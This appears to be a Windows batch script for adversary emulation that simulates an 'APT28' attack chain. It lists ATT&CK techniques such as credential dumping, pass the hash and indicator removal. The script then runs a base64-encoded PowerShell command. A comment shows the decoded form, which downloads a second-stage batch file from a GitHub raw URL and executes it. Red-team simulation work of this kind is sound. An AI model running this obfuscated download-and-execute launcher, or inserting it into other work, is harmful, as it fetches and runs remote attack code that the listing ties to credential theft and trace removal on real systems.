@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO [-] Simulates a typical "APT28" Execution involving multiple techniques
ECHO.
ECHO [-] Technique Involved:
ECHO     [+] T1086  PowerShell
ECHO     [+] T1027  Obfuscated Files or Information
ECHO     [+] T1059  Command-Line Interface
ECHO     [+] T1057  Process Discovery
ECHO     [+] T1105  Remote File Copy
ECHO     [+] T1083  File and Directory Discovery
ECHO     [+] T1119	Automated Collection
ECHO     [+] T1005	Data from Local System
ECHO     [+] T1085  Rundll32
ECHO     [+] T1064  Scripting
ECHO     [+] T1003	Credential Dumping
ECHO     [+] T1075  Pass the Hash
ECHO     [+] T1074  Data Staged
ECHO     [+] T1037	Logon Scripts
ECHO     [+] T1099  Timestomp
ECHO     [+] T1107  File Deletion
ECHO     [+] T1002	Data Compressed
ECHO     [+] T1158	Hidden Files and Directories
ECHO     [+] T1070  Indicator Removal on Host
ECHO -------------------------------------------------------------------
powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZwByAGUAeQBjAGUAbAAvAEEAUABUAC0AUwBpAG0AdQBsAGEAdABpAG8AbgAvAG0AYQBzAHQAZQByAC8AQQBQAFQAMgA4AC8AQQBQAFQAMgA4AF8AQwBoAGEAaQBuAFIAZQBhAGMAdABpAG8AbgAvAEEAUABUADIAOABfAEMAaABhAGkAbgBfAE8AZgBfAFQAZQBjAGgAbgBpAHEAdQBlAHMAIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwARwByAGUAeQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAQQBQAFQAMgA4AFwAQQBQAFQAMgA4AF8AQwBoAGEAaQBuAF8ATwBmAF8AVABlAGMAaABuAGkAcQB1AGUAcwAuAGIAYQB0ACIAKQA7ACAAcwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgACIAYwBtAGQALgBlAHgAZQAiACAAIgAvAGsAIABDADoAXABVAHMAZQByAHMAXABHAHIAZQB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFAAVAAyADgAXABBAFAAVAAyADgAXwBDAGgAYQBpAG4AXwBPAGYAXwBUAGUAYwBoAG4AaQBxAHUAZQBzAC4AYgBhAHQAIgA=
ECHO -------------------------------------------------------------------
::Decoded-Payload: 
::------------------
:: (New-Object Net.WebClient).Downloadfile(`"https://raw.githubusercontent.com/greycel/APT-Simulation/master/APT28/APT28_ChainReaction/APT28_Chain_Of_Techniques`",`"$env:temp\APT28\APT28_Chain_Of_Techniques.bat`"); start-process `"cmd.exe`" `"/k $env:temp\APT28\APT28_Chain_Of_Techniques.bat`"
ECHO.

